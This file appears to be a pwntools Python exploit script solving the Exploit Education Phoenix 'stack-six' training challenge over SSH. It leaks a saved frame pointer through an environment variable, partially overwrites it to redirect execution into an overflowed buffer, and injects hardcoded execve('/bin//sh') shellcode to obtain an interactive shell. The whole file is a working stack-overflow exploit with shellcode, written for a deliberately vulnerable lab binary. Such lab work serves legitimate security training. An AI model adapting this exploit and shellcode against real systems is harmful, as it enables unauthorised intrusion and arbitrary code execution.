#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('stack-six')

host = args.HOST or 'localhost'
port = int(args.PORT or 2222)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/phoenix/amd64/stack-six'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

# The overflow lets us do a partial overwrite of the saved RBP, which gives us control of main's ret. First we leak the correct saved RBP, then substract 0x10 as our buffer is located 0x10 higher on the stack, the leave then does all the work for us and puts the address of our buffer on the top of the stack, ready to be put into RIP

def leak():
    buf = b'a'*0x7e
    io = start(env={'ExploitEducation':buf})
    res = io.recvall().strip()
    leak = res.split(b' ')[-1][0x7e:] + b'\x00'*2
    #print(leak)
    log.info(f'We leaked: {hex(u64(leak))}')
    return p8(leak[0]-0x10)

byte = leak()
buf = b"\x48\x31\xc0\x50\xb0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05"
buf += b'a'*(0x7e-len(buf))
buf += byte

io = start(env={'ExploitEducation':buf})

io.interactive()

